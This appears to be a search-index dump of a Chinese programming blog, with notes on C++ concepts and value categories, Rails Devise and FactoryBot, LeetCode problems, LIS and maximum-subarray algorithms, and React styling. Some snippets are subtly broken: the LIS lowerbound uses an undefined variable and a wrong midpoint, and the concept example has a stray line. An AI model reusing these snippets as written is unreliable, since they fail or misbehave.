(S&lt;T&gt;&#123;&#125;)void f(T);\n所以concept其實就是使用SFINAE的template程式碼的語法糖?\ntemplate&lt;typename T&gt;concept Hashable = requires(T a) &#123;    a.keep_walking    &#123; std::hash&lt;T&gt;&#123;&#125;(a) &#125; -&gt; std::convertible_to&lt;std::size_t&gt;;&#125;; struct meow &#123;&#125;; template&lt;Hashable T&gt;void f(T); // constrained C++20 function template // Alternative ways to apply the same constraint:// template&lt;typename T&gt;//    requires Hashable&lt;T&gt;// void f(T); // // template&lt;typename T&gt;// void f(T) requires Hashable&lt;T&gt;;  int main() &#123;  f(&quot;abc&quot;); // OK, std::string satisfies Hashable  f(meow&#123;&#125;); // Error: meow does not satisfy Hashable&#125;\nRef\nC++ Core Guidelines: Rules for Template Metaprogramming\n【C++ Template Meta-Programming】認識樣板超編程 (TMP)\ndecltype\n【C++ Template Meta-Programming】參數列表\nC++ templates: Creating a compile-time higher-order meta-programming language\nWhy can’t I use float value as a template parameter?\nWhy can templates only be implemented in the header file?\nC++ template function compiles in header but not implementation\n细说 C++ Traits Classes\n【C++ Template Meta-Programming】Traits 技巧\nC++ TUTORIAL - TRAITS : A TEMPLATE SPECIALIZATION - 2020\nSFINAE\nSFINAE（替換失敗不是錯誤）\n認識SFINAE\nSubstitution failure is not an error\n【C++ Template Meta-Programming】函式多載與 SFINAE 初步\n【C++ Template Meta-Programming】SFINAE\n【C++ Template Meta-Programming】到處 SFINAE\n说说 C++ 的 Concept\nConstraints and concepts (since C++20)\n","categories":["C++","FAQ"]},{"title":"cpp的Value Categories","url":"/2020/12/cpp-value-category/","content":"動機\n自從多了move之後，C++就整個不一樣了。\n變得十分的詭異，move與現在要講的這個 Value Categories。\n\n定義一些關鍵字(以十分非正式的方式)\n\nidentity: 變數，應該說有可以透過變數或是ptr存取到的東西\nobject: class或是struct\n\n架構\n\n\nexpression\n\nglvaue\n\nlvalue\nxvalue\n\n\nrvalue\n\nprvalue\nxvalue\n\n\n\n\n\nprvalue\n沒有identity的資料，也就是沒有被assign或是與object的attr有關的資料\n像\n\nliteral(string是lvalue，他本身就是array，但不能改)\nlambda\n沒有被assign的bject\n臨時被造出來的object\n\nxvalue\n很快就會被搬空(&amp;&amp;, std::move)的變數(或是位置)，或是臨時被造出來的object上的變數\n主要xvalue就是變數，但很快就會消失，變數自身、裡面的資料\n例子\nstruct X &#123; int n; &#125;;extern X x;4;                   // prvalue: does not have an identity// 如果宿主是lvalue，attr也是lvaluex;                   // lvaluex.n;                 // lvaluestd::move(x);        // xvaluestd::forward&lt;X&amp;&gt;(x); // lvalue// 如果宿主是prvalue，attr會是xvalueX&#123;4&#125;;                // prvalue: does not have an identityX&#123;4&#125;.n;              // xvalue\nlvalue\n沒有被move的變數都是lvalue，另外function要看他的return type，如果是lvalue就是lvalue，不然就是prvalue\n例子\nX x;         // x is an lvalueX* px = &amp;x;  // px is an lvalue*px = X&#123;&#125;;   // *px is also an lvalue, X&#123;&#125; is a prvalueX* foo_ptr();  // foo_ptr() is a prvalue, cuz X* is prvalueX&amp; foo_ref();  // foo_ref() is an lvalue, cuz X&amp; is lvalue\nlvalue &amp; lvalue 與 prvalue &amp; xvalue\n可以用派生的感覺去看\nlvalue的attr是lvalue (有變數去存)\nprvalue的attr是xvalue (依附在沒有存在變數的資料上)\nRef\n讓我看懂這到底是什麼鬼東西好文章，推爆\nWhat are rvalues, lvalues, xvalues, glvalues, and prvalues?\n","categories":["C++","FAQ"]},{"title":"客製化devise的controller與錯誤訊息","url":"/2020/12/customize-devise-controller/","content":"動機\n想要丟自己的json與錯誤訊息\n\ncustom controller\ncontroller\n\n生controller: rails generate devise:controllers users -c=sessions\n\n\n-c是種類，users是controller放在app/controller中的哪個資料夾\n其他種類有\n\nconfirmations\npasswords\nregistrations\nsessions\nunlocks\nomniauth_callbacks\n\n\n\n\noverride method\n\n\n不要期待callback: devise都是在devise跑完他自己的東西後才會調用callback，所以有的時候還要自己重寫method\n直接看code中的method去override需要的部分\n例如\n\nrespond_with: 是處理要return的訊息\nrespond_to_on_destroy: 在登出後要return的訊息\n\n\n\nroutes\n在devise_for中指定controller，像\ndevise_for :users, # 資料夾在?            path: &#x27;&#x27;, # 原本是/users/sign_in之類的，現在變成/sign_in            controllers: &#123; sessions: &#x27;users/sessions&#x27;,                            registrations: &#x27;users/registrations&#x27;,                            passwords: &#x27;users/passwords&#x27; &#125;\ncustom Error Msg\nfailure_app\n加自己的failure_app，像\nclass MyDeviseFailureApp &lt; Devise::FailureApp  def http_auth_body    return super unless request_format == :json    &#123;      sucess: false,      msg: i18n_message    &#125;.to_json  endend\nload my failure_app\n因為我是放在/lib，所以要去加autoload的路徑\n到config/application.rb註冊\nclass Application &lt; Rails::Application  config.autoload_paths &lt;&lt; Rails.root.join(&#x27;lib&#x27;)end\nregister failure_app\n到config/initializers/devise.rb註冊\nDevise.setup do |config|  config.warden do |manager|    manager.failure_app = MyDeviseFailureApp  endend","categories":["Rails","Tips"]},{"title":"factorybot使用心得","url":"/2020/12/factorybot-tips/","content":"動機\n終於用了factorybot，記下一些使用心得\n\n描述欄位\ntrait &amp; transient\n使用上trait就是物件的狀態，transient是factory的參數\ntrait就是 可以設定物件的欄位\ntransient就是 factory的參數\nfactory :copy do  on_shelf # default  book  transient do    which_state &#123; &quot;on_shelf&quot; &#125;  end  copy_state &#123; which_state &#125;  trait :on_shelf do    copy_state &#123; &quot;on_shelf&quot; &#125;  end  trait :read_by_someone do    copy_state &#123; &quot;read_by_someone&quot; &#125;  endend\nfactory :copy do  book  transient do    which_state &#123; &quot;on_shelf&quot; &#125;  end  copy_state &#123; which_state &#125;end\nsequence\nsequence(:reader_email) &#123; |n| &quot;read#&#123;n&#125;@example.com&quot; &#125;\nbuild &amp; create &amp; build_stubbed\ncreate就是原本的create，會在DB生一筆數據\nbuild雖然說不會create新model，但是如果有association，連帶的東西就會被生(create)出來!!\n所以build_stubbed，連association的部分都不會被生出來\ncreate_list\n就算是has_many的部分，就算用create_list，都會分別創一個新的物件，id是不一樣的!!\n一個是在after的callback自己塞，不然就是指定foreign key\nlet! in rspec &amp; create\n不知道為什麼，如果要用create的話要放在let!中，不然就不會有物件產生\n還有let!最好也越早放越好，不然也會發生在DB中沒有物件這種事，不是說放在it前面就會動\nrspec is dynamic scope\n最初會注意到是因為下面這段code跑得動\nbefore &#123; patch &quot;/reader/borrow&quot;, headers: who, params: &#123; copy_id: copy.id, reader_id: a_reader.id &#125;, as: :json &#125;    context &#x27;is reader&#x27; do  let(:who) &#123; reader_header &#125;  # ...endcontext &#x27;not reader&#x27; do  let(:who) &#123; base_header &#125;  # ...end\n這樣before的who會吃到不一樣的header，這就是dynamic scope，變數是依據當下執行的環境。\n這跑起來很方便，但是很不好trace\nRef\nrspec is dynamic scope\n","categories":["Rails","Tips"]},{"title":"leetcode-1046 - Last Stone Weight","url":"/2020/12/leetcode-1046/","content":"動機\n練heapq\n\nProblem\nWe have a collection of stones, each stone has a positive integer weight.Each turn, we choose the two heaviest stones and smash them together.  Suppose the stones have weights x and y with x ","categories":["Algorithm","Leetcode"],"tags":["Array","Heap (Priority Queue)"]},{"title":"leetcode-122 - Best Time to Buy and Sell Stock II","url":"/2020/12/leetcode-122/","content":"動機\n\n列舉十分可怕\n不要拘泥於題目\n新看法: 把資料畫成座標圖\n\n\nProblem\nYou are given an array prices where prices[i] is the price of a given stock on the ith day.Find the maximum profit you can achieve. You may complete as many transactions as you like (i.e., buy one and sell one share of the stock multiple times).Note: You may not engage in multiple transactions simultaneously (i.e., you must sell the stock before you buy again). Example 1:Input: prices = [7,1,5,3,6,4]Output: 7Explanation: Buy on day 2 (price = 1) and sell on day 3 (price = 5), profit = 5-1 = 4.Then buy on day 4 (price = 3) and sell on day 5 (price = 6), profit = 6-3 = 3.Example 2:Input: prices = [1,2,3,4,5]Output: 4Explanation: Buy on day 1 (price = 1) and sell on day 5 (price = 5), profit = 5-1 = 4.Note that you cannot buy on day 1, buy on day 2 and sell them later, as you are engaging multiple transactions at the same time. You must sell before buying again.Example 3:Input: prices = [7,6,4,3,1]Output: 0Explanation: In this case, no transaction is done, i.e., max profit = 0. Constraints:1 ","categories":["Algorithm","Leetcode","60 questions to solve","Top Interview Questions"],"tags":["Dynamic Programming","Array","Greedy"]},{"title":"leetcode-146 - LRU Cache","url":"/2020/12/leetcode-146/","content":"動機\n兩題很像，所以就一起寫\n\nProblem\nDesign a data structure that follows the constraints of a Least Recently Used (LRU) cache.Implement the LRUCache class:LRUCache(int capacity) Initialize the LRU cache with positive size capacity.int get(int key) Return the value of the key if the key exists, otherwise return -1.void put(int key, int value) Update the value of the key if the key exists. Otherwise, add the key-value pair to the cache. If the number of keys exceeds the capacity from this operation, evict the least recently used key.The functions get and put must each run in O(1) average time complexity. Example 1:Input[LRUCache, put, put, get, put, get, put, get, get, get][[2], [1, 1], [2, 2], [1], [3, 3], [2], [4, 4], [1], [3], [4]]Output[null, null, null, 1, null, -1, null, -1, 3, 4]ExplanationLRUCache lRUCache = new LRUCache(2);lRUCache.put(1, 1); // cache is {1=1}lRUCache.put(2, 2); // cache is {1=1, 2=2}lRUCache.get(1);    // return 1lRUCache.put(3, 3); // LRU key was 2, evicts key 2, cache is {1=1, 3=3}lRUCache.get(2);    // returns -1 (not found)lRUCache.put(4, 4); // LRU key was 1, evicts key 1, cache is {4=4, 3=3}lRUCache.get(1);    // return -1 (not found)lRUCache.get(3);    // return 3lRUCache.get(4);    // return 4 Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","CTCI-COMPLETE-LIST"],"tags":["Design","Doubly-Linked List","Linked List","Hash Table"]},{"title":"leetcode-162 - Find Peak Element","url":"/2020/12/leetcode-162/","content":"動機\n二分搜怎麼那麼難搞\n\nProblem\nA peak element is an element that is strictly greater than its neighbors.Given an integer array nums, find a peak element, and return its index. If the array contains multiple peaks, return the index to any of the peaks.You may imagine that nums[-1] = nums[n] = -∞.You must write an algorithm that runs in O(log n) time. Example 1:Input: nums = [1,2,3,1]Output: 2Explanation: 3 is a peak element and your function should return the index number 2.Example 2:Input: nums = [1,2,1,3,5,6,4]Output: 5Explanation: Your function can return either index number 1 where the peak element is 2, or index number 5 where the peak element is 6. Constraints:1 ","categories":["Algorithm","Leetcode","Top Interview Questions","seanprashad"],"tags":["Array","Binary Search"]},{"title":"leetcode-274 - H-Index","url":"/2020/12/leetcode-274/","content":"動機\n當初了解定義花了很久時間\n\nProblem\nGiven an array of integers citations where citations[i] is the number of citations a researcher received for their ith paper, return compute the researcher's h-index.According to the definition of h-index on Wikipedia: A scientist has an index h if h of their n papers have at least h citations each, and the other n − h papers have no more than h citations each.If there are several possible values for h, the maximum one is taken as the h-index. Example 1:Input: citations = [3,0,6,1,5]Output: 3Explanation: [3,0,6,1,5] means the researcher has 5 papers in total and each of them had received 3, 0, 6, 1, 5 citations respectively.Since the researcher has 3 papers with at least 3 citations each and the remaining two with no more than 3 citations each, their h-index is 3.Example 2:Input: citations = [1,3,1]Output: 1 Constraints:n == citations.length1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Counting Sort","Sorting"]},{"title":"leetcode-275 - H-Index II","url":"/2020/12/leetcode-275/","content":"動機\n把二分搜最討厭的部分完全展示的一題\n\nProblem\nGiven an array of integers citations where citations[i] is the number of citations a researcher received for their ith paper and citations is sorted in an ascending order, return compute the researcher's h-index.According to the definition of h-index on Wikipedia: A scientist has an index h if h of their n papers have at least h citations each, and the other n − h papers have no more than h citations each.If there are several possible values for h, the maximum one is taken as the h-index.You must write an algorithm that runs in logarithmic time. Example 1:Input: citations = [0,1,3,5,6]Output: 3Explanation: [0,1,3,5,6] means the researcher has 5 papers in total and each of them had received 0, 1, 3, 5, 6 citations respectively.Since the researcher has 3 papers with at least 3 citations each and the remaining two with no more than 3 citations each, their h-index is 3.Example 2:Input: citations = [1,2,100]Output: 2 Constraints:n == citations.length1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Binary Search"]},{"title":"leetcode-292 - Nim Game","url":"/2020/12/leetcode-292/","content":"動機\n原來這麼簡單!?\n\nProblem\nYou are playing the following Nim Game with your friend:Initially, there is a heap of stones on the table.You and your friend will alternate taking turns, and you go first.On each turn, the person whose turn it is will remove 1 to 3 stones from the heap.The one who removes the last stone is the winner.Given n, the number of stones in the heap, return true if you can win the game assuming both you and your friend play optimally, otherwise return false. Example 1:Input: n = 4Output: falseExplanation: These are the possible outcomes:1. You remove 1 stone. Your friend removes 3 stones, including the last stone. Your friend wins.2. You remove 2 stones. Your friend removes 2 stones, including the last stone. Your friend wins.3. You remove 3 stones. Your friend removes the last stone. Your friend wins.In all outcomes, your friend wins.Example 2:Input: n = 1Output: trueExample 3:Input: n = 2Output: true Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Math","Game Theory","Brainteaser"]},{"title":"leetcode-312 - Burst Balloons","url":"/2020/12/leetcode-312/","content":"動機\n分治與dp在轉念之間\n\nProblem\nYou are given n balloons, indexed from 0 to n - 1. Each balloon is painted with a number on it represented by an array nums. You are asked to burst all the balloons.If you burst the ith balloon, you will get nums[i - 1] * nums[i] * nums[i + 1] coins. If i - 1 or i + 1 goes out of bounds of the array, then treat it as if there is a balloon with a 1 painted on it.Return the maximum coins you can collect by bursting the balloons wisely. Example 1:Input: nums = [3,1,5,8]Output: 167Explanation:nums = [3,1,5,8] --> [3,5,8] --> [3,8] --> [8] --> []coins =  3*1*5    +   3*5*8   +  1*3*8  + 1*8*1 = 167Example 2:Input: nums = [1,5]Output: 10 Constraints:n == nums.length1 ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming","Array"]},{"title":"leetcode-313 - Super Ugly Number","url":"/2020/12/leetcode-313/","content":"動機\n值得回味的題目\n\nProblem\nA super ugly number is a positive integer whose prime factors are in the array primes.Given an integer n and an array of integers primes, return the nth super ugly number.The nth super ugly number is guaranteed to fit in a 32-bit signed integer. Example 1:Input: n = 12, primes = [2,7,13,19]Output: 32Explanation: [1,2,4,7,8,13,14,16,19,26,28,32] is the sequence of the first 12 super ugly numbers given primes = [2,7,13,19].Example 2:Input: n = 1, primes = [2,3,5]Output: 1Explanation: 1 has no prime factors, therefore all of its prime factors are in the array primes = [2,3,5]. Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming","Array","Math","Heap (Priority Queue)","Hash Table"]},{"title":"leetcode-41 - First Missing Positive","url":"/2020/12/leetcode-41/","content":"動機\n資料本身也是有特性的\n\nProblem\nGiven an unsorted integer array nums, return the smallest missing positive integer.You must implement an algorithm that runs in O(n) time and uses constant extra space. Example 1:Input: nums = [1,2,0]Output: 3Example 2:Input: nums = [3,4,-1,1]Output: 2Example 3:Input: nums = [7,8,9,11,12]Output: 1 Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad"],"tags":["Array","Hash Table"]},{"title":"leetcode-451 - Sort Characters By Frequency","url":"/2020/12/leetcode-451/","content":"動機\n這題是medium!?\n\nProblem\nGiven a string s, sort it in decreasing order based on the frequency of characters, and return the sorted string. Example 1:Input: s = treeOutput: eertExplanation: 'e' appears twice while 'r' and 't' both appear once.So 'e' must appear before both 'r' and 't'. Therefore eetr is also a valid answer.Example 2:Input: s = cccaaaOutput: aaacccExplanation: Both 'c' and 'a' appear three times, so aaaccc is also a valid answer.Note that cacaca is incorrect, as the same characters must be together.Example 3:Input: s = AabbOutput: bbAaExplanation: bbaA is also a valid answer, but Aabb is incorrect.Note that 'A' and 'a' are treated as two different characters. Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["String","Heap (Priority Queue)","Hash Table","Sorting","Counting","Bucket Sort"]},{"title":"leetcode-460 - LFU Cache","url":"/2020/12/leetcode-460/","content":"動機\n兩題很像，所以就一起寫\n\nProblem\nDesign and implement a data structure for a Least Frequently Used (LFU) cache.Implement the LFUCache class:LFUCache(int capacity) Initializes the object with the capacity of the data structure.int get(int key) Gets the value of the key if the key exists in the cache. Otherwise, returns -1.void put(int key, int value) Update the value of the key if present, or inserts the key if not already present. When the cache reaches its capacity, it should invalidate and remove the least frequently used key before inserting a new item. For this problem, when there is a tie (i.e., two or more keys with the same frequency), the least recently used key would be invalidated.To determine the least frequently used key, a use counter is maintained for each key in the cache. The key with the smallest use counter is the least frequently used key.When a key is first inserted into the cache, its use counter is set to 1 (due to the put operation). The use counter for a key in the cache is incremented either a get or put operation is called on it.The functions get and put must each run in O(1) average time complexity. Example 1:Input[LFUCache, put, put, get, put, get, get, put, get, get, get][[2], [1, 1], [2, 2], [1], [3, 3], [2], [3], [4, 4], [1], [3], [4]]Output[null, null, null, 1, null, -1, 3, null, -1, 3, 4]Explanation// cnt(x) = the use counter for key x// cache=[] will show the last used order for tiebreakers (leftmost element is  most recent)LFUCache lfu = new LFUCache(2);lfu.put(1, 1);   // cache=[1,_], cnt(1)=1lfu.put(2, 2);   // cache=[2,1], cnt(2)=1, cnt(1)=1lfu.get(1);      // return 1                 // cache=[1,2], cnt(2)=1, cnt(1)=2lfu.put(3, 3);   // 2 is the LFU key because cnt(2)=1 is the smallest, invalidate 2.                 // cache=[3,1], cnt(3)=1, cnt(1)=2lfu.get(2);      // return -1 (not found)lfu.get(3);      // return 3                 // cache=[3,1], cnt(3)=2, cnt(1)=2lfu.put(4, 4);   // Both 1 and 3 have the same cnt, but 1 is LRU, invalidate 1.                 // cache=[4,3], cnt(4)=1, cnt(3)=2lfu.get(1);      // return -1 (not found)lfu.get(3);      // return 3                 // cache=[3,4], cnt(4)=1, cnt(3)=3lfu.get(4);      // return 4                 // cache=[3,4], cnt(4)=2, cnt(3)=3 Constraints:0 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","CTCI-COMPLETE-LIST"],"tags":["Design","Doubly-Linked List","Linked List","Hash Table"]},{"title":"leetcode-49 - Group Anagrams","url":"/2020/12/leetcode-49/","content":"動機\n水題~~\n\nProblem\nGiven an array of strings strs, group the anagrams together. You can return the answer in any order.An Anagram is a word or phrase formed by rearranging the letters of a different word or phrase, typically using all the original letters exactly once. Example 1:Input: strs = [eat,tea,tan,ate,nat,bat]Output: [[bat],[nat,tan],[ate,eat,tea]]Example 2:Input: strs = []Output: [[]]Example 3:Input: strs = [a]Output: [[a]] Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","60 questions to solve","Top Interview Questions","CTCI-COMPLETE-LIST","Blind Curated 75"],"tags":["String","Hash Table","Sorting"]},{"title":"leetcode-692 - Top K Frequent Words","url":"/2020/12/leetcode-692/","content":"動機\nmedium!?\n\nProblem\nGiven a non-empty list of words, return the k most frequent elements.Your answer should be sorted by frequency from highest to lowest. If two words have the same frequency, then the word with the lower alphabetical order comes first.Example 1:Input: [i, love, leetcode, i, love, coding], k = 2Output: [i, love]Explanation: i and love are the two most frequent words.    Note that i comes before love due to a lower alphabetical order.Example 2:Input: [the, day, is, sunny, the, the, the, sunny, is, is], k = 4Output: [the, is, sunny, day]Explanation: the, is, sunny and day are the four most frequent words,    with the number of occurrence being 4, 3, 2 and 1 respectively.Note:You may assume k is always valid, 1 ≤ k ≤ number of unique elements.Input words contain only lowercase letters.Follow up:Try to solve it in O(n log k) time and O(n) extra space.\nSol\n兩個hash去對\n\nstring =&gt; 次數\n次數 =&gt; [string]\n\nBTW，from collections import Counter\n可以計算 string =&gt; 次數\nclass Solution:    def topKFrequent(self, ws: List[str], kk: int) -&gt; List[str]:        w_t = &#123;&#125;        t_ws = &#123;&#125;                for w in ws:            if w not in w_t:                w_t[w] = 1            else:                w_t[w] += 1                for (k,v) in w_t.items():            if v not in t_ws:                t_ws[v] = [k]            else:                t_ws[v].append(k)                t_iter = iter(sorted(t_ws.keys(),reverse=True))        ret = []        while kk != 0:            t = next(t_iter)            if kk &lt; len(t_ws[t]):                ret += sorted(t_ws[t])[:kk]                kk = 0            elif kk == len(t_ws[t]):                ret += sorted(t_ws[t])                kk = 0            else:                ret += sorted(t_ws[t])                kk -= len(t_ws[t])        return ret","categories":["Algorithm","Leetcode"],"tags":["String","Heap (Priority Queue)","Hash Table","Sorting","Counting","Bucket Sort","Trie"]},{"title":"leetcode-72 - Edit Distance","url":"/2020/12/leetcode-72/","content":"動機\ninsert是最難想的部分\n\nProblem\nGiven two strings word1 and word2, return the minimum number of operations required to convert word1 to word2.You have the following three operations permitted on a word:Insert a characterDelete a characterReplace a character Example 1:Input: word1 = horse, word2 = rosOutput: 3Explanation: horse -> rorse (replace 'h' with 'r')rorse -> rose (remove 'r')rose -> ros (remove 'e')Example 2:Input: word1 = intention, word2 = executionOutput: 5Explanation: intention -> inention (remove 't')inention -> enention (replace 'i' with 'e')enention -> exention (replace 'n' with 'x')exention -> exection (replace 'n' with 'c')exection -> execution (insert 'u') Constraints:0 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","CTCI-COMPLETE-LIST"],"tags":["Dynamic Programming","String"]},{"title":"Longest Increasing Subsequence","url":"/2020/12/lis/","content":"動機\n記錄用\n\nDP\n定義lis[i]為以i為終點的最長lis長度\n@functools.lru_cache(None)def lis(i):  global l  return max([lis(x) for x in range(0,i) if l[i] &gt; l[x]]+[0])+1\nDP with binary search\n如果說新的數字比目前的lis最後一個大，就長度就直接加上去\n如果比他小，不會影響長度，但是可能會形成更長的lis，可以找個差不多的數字去取代他，用lowerbound\n如果要建構lis的話，可以記下數字在構成lis的index，之後就是根據長度，從後面往前找吻合當前長度的index\n一個一個湊出來\ndef lowerbound(l, target):  i = 0  j = len(m)-1  while (j-i) &gt; 1:    mid = (i+l)//2    if l[mid] &gt;= target:      j = mid    else:      i = mid+1  return idef lis(l):  idx = [-1] * len(l)  ret = [l[0]]  for i in range(1,len(l)):    if l[i] &gt; ret[-1]:      ret.append(l[i])      idx[i] = i    else:      j = lowerbound(ret,l[i])      ret[j] = l[i]      idx[i] = j  return len(ret)  &#x27;&#x27;&#x27;  ans = []  revl = reversed(iter(l))  revidx = reversed(iter(idx))  nowidx = next(revidx)  nowval = next(revl)  for i in reversed(range(0,len(ret))):    while nowidx != i:      nowidx = next(revidx)      nowval = next(revl)    ans.append(nowval)  ans.reverse()  return ans  &#x27;&#x27;&#x27;\nLCS(Longest Common Subsequence)\n找lcs的長度\n像\ns1: 2 5 7 9 3 1 2s2: 3 5 3 2 8lcs(s1,s2) = 3 (5 3 2)\n@cachedef lcs(a,b):  if not a or not b:    return 0  elif a[0] == b[0]:    return 1+lcs(a[1:],b[1:])  else:    return max(lcs(a,b[1:]),lcs(a[1:],b))\nRef\n演算法筆記\n","categories":["Algorithm","Classic"]},{"title":"在react中如何處理css","url":"/2020/12/morden-css/","content":"動機\n雖是說在react中如何處理css其實就是看如何處理css的封裝，\n同時如何在封裝的基礎上重用code，最後如何動態決定css\n\nCSS Modules\n只有兩層scope，global與local\n命名有限制\n方便與第三方CSS整合\nwebpack的loader有實做\nimport styles from &quot;./style.css&quot;;// import &#123; className &#125; from &quot;./style.css&quot;;element.innerHTML = &#x27;&lt;div class=&quot;&#x27; + styles.className + &#x27;&quot;&gt;&#x27;;:global &#123;  .global-class-name &#123;    color: green;  &#125;&#125;:global(.title) &#123; /*也有 :local(...)*/  color: green;&#125;\n繼承\n.otherClassName &#123;  composes: className from &quot;./style.css&quot;;  composes: globalClassName from global;&#125;\nStyled Components\nimport styled from &#x27;styled-components&#x27;;const Box = styled.div`  margin: 15px 0;  padding: 15px;  color: $&#123;(props) =&gt; props.color&#125;;  background: tomato;  border-radius: 10px;`;const getStyles = (&#123; color, bg &#125;) =&gt; (&#123;  color,  background: bg,&#125;);const Box = styled.div`  margin: 15px 0;  padding: 15px;  $&#123;getStyles&#125;;  border-radius: 10px;`;&lt;Box color=&#x27;#fff&#x27; bg=&#x27;tomato&#x27;&gt;  Hello World&lt;/Box&gt;\n繼承\nconst Button = styled.button`  color: palevioletred;  font-size: 1em;  margin: 1em;  padding: 0.25em 1em;  border: 2px solid palevioletred;  border-radius: 3px;`;// A new component based on Button, but with some override stylesconst TomatoButton = styled(Button)`  color: tomato;  border-color: tomato;`;\nstyled-jsx\n類似vue的style，都放在style tag中\nrender () &#123;    return &lt;div className=&#x27;table&#x27;&gt;        &lt;div className=&#x27;row&#x27;&gt;            &lt;div className=&#x27;cell&#x27;&gt;A0&lt;/div&gt;            &lt;div className=&#x27;cell&#x27;&gt;B0&lt;/div&gt;        &lt;/div&gt;        &lt;style jsx&gt;&#123;`          .table &#123;            margin: 10px;          &#125;          .row &#123;            border: 1px solid black;          &#125;          .cell &#123;            color: red;          &#125;    `&#125;&lt;/style&gt;    &lt;/div&gt;;&#125;\nimport css from &#x27;styled-jsx/css&#x27;export default () =&gt; (  &lt;div&gt;    &lt;button&gt;styled-jsx&lt;/button&gt;    &lt;style jsx&gt;&#123;button&#125;&lt;/style&gt;  &lt;/div&gt;)const button = css`button &#123; color: hotpink; &#125;`\nexport default (props) =&gt; (  &lt;div&gt;    &lt;button&gt;styled-jsx&lt;/button&gt;    &lt;style jsx&gt;&#123;      `button &#123; color: $&#123;props.color&#125;; &#125;`    &#125;&lt;/style&gt;  &lt;/div&gt;)\nexport default () =&gt; (  &lt;div&gt;    &lt;style jsx global&gt;&#123;`      body &#123;        background: red      &#125;    `&#125;&lt;/style&gt;  &lt;/div&gt;)\n繼承\n很麻煩，跳過\nfunctional css\n雖然說這與react的css無關，但還是想提一下\nfunctional css是把每條css包成一個個小小的class要用時就直接加在class上，像\n&lt;style&gt;.c-red &#123; color: $color-red; &#125;.c-yellow &#123; color: $color-yellow; &#125;.c-white &#123; color: white; &#125;.c-green &#123; color: $color-green; &#125;...&lt;/style&gt;&lt;div class=&quot;m-5 p-5 text-gray-light bg-gray-darker border border-gray-light&quot;&gt;  ...&lt;/div&gt;\n這會造成什麼現象?\n\n每個tag的style與其他tag的style不再相關，style現在真的只是tag的一個屬性，而不是css也有自己的結構\nstyle的class對應到的是功能，不是元件\n\n這會導致寫的時候只要思考，這個tag要展現什麼就好，不用思考這個元件要展現什麼就好以及這個class與其他元件的關係(in CSS)\npostcss\nsass是把 sass轉成css\npostcss是把 css轉成css\n都是compiler，但是postcss可以自己擴充需要對什麼語法做處理，像CSS Modules，就可以透過postcss來轉換\n","categories":["CSS","Tips"]},{"title":"Maximum Subarray Sum","url":"/2020/12/mss/","content":"動機\n分治也是可以重複走的\n\n暴力\n就列舉\ndef mss(l):  return max([[sum(l[i:j+1]) for j in range(0, len(l)-i)] for i in range(0,len(l))])\n分治\n分成\n\n只有左邊\n只有右邊\ncross兩邊\n\n兩邊怎麼算?\n從中間延伸出去，再把兩邊加起來\n原本認定分治的割出來的遞迴是不會重複走到之前其他遞迴走過的部分\n但經過這個才想起來，merge sort也是都重複走了array log(n)次阿!!\ndef helper(l):    if len(l) == 0:        return 0    ret = tmp = l[0]    for n in l[1:]:        tmp += n        ret = max(ret, tmp)    return retdef mss(l: List[int]) -&gt; int:    if not l:        return 0    if len(l) == 1:        return l[0]    else:        if len(l) % 2 == 0:            mid = len(l) // 2            onlyLeft = mss(l[:mid])            onlyRight = mss(l[mid:])            center = 0            left = helper(l[:mid][::-1])            right = helper(l[mid:])        else:            mid = len(l) // 2            onlyLeft = mss(l[:mid+1])            onlyRight = mss(l[mid:])            center = l[mid]            left = helper(l[:mid][::-1])            right = helper(l[mid+1:])    return max([center + left + right, onlyLeft, onlyRight])\nDP\ntmp紀錄定義為以此為終點的mss\n之後就是看之前的加現在看哪個大\ndef mss(self, nums: List[int]) -&gt; int:    ret = tmp = nums[0]    for n in nums[1:]:        tmp = max(n, n+tmp)        ret = max(ret, tmp)    return ret\nRef\n分治 P.S.:geeksforgeeks的資料會不會太贊了\n","categories":["Algorithm","Classic"]},{"title":"reactJS筆記","url":"/2020/12/react-js-note/","content":"動機\n現在backend已經能動了，雖然有許多可以改進的地方…\n但還是先讓他動起來，所以先來看前端框架\n\nJSX\n大概結構像\nJS  =&gt; HTML    =&gt; &#123;JS&#125;\nJS中有HTML，HTML中有JS，但要包起來\n同時區分html tag與component的方式是第一個字有沒有大寫\nclass &amp; hook\nclass 是在同一元件下的所有狀態共用同一個life circle(所以一旦很多事要做，會很擠)，\n然而hook會自己附到相對應的life circle階段，如果state之間互像影響會讓code跳來跳去的，變得不好看\n整體而言(資料的傳遞方式)\n一路向下，資料都是從parent到child，都用attr傳到props中，child要改變上層的狀態只能透過\n\n來自parent的callback來改變狀態\ncontext來傳遞\n\n但這樣很verbose，也會很混亂，不好trace，都是因為資料只能一路向下，對此重構的方式有\n\n從源頭解決: 把state往上抽、high-order-component、props’ render function\n抽到全域: flux\n\n可控與不可控元件\n資料的路徑都是\n\nevent會碰到來自parent的callback\ncallback會setstate自己(parent)的state\n最後透過props去render\n\n但是，兩個差在資料的來源不同\n可控\n\nevent會碰到來自parent的callback (input從event來)\ncallback會setstate自己(parent)的state\n最後透過props去render\n\n不可控\n\nevent會碰到來自parent的callback\ncallback會setstate自己(parent)的state (input從ref來)\n最後透過props去render\n\n因為ref被用來綁dom，所以如果是要從很上層傳ref下去會很痛苦，所以有forwardref，其實就是用function去接ref，而不是用props\n大概的演化流程\nView + Controller(ViewModel, representation model) =&gt; View + Controller + Model =&gt; View + Route + Controller + Model\n一開始view與邏輯是和在一起，後面為了管理許多資料，先把view與邏輯分出來，變成view(presentation component)與controller(container component)，最後把狀態抽到同一個地方，成為model\nFlux\n就是有限狀態機，在MVC中的model\n大概就是\n\n把所有邏輯放到狀態機中(dispatcher, 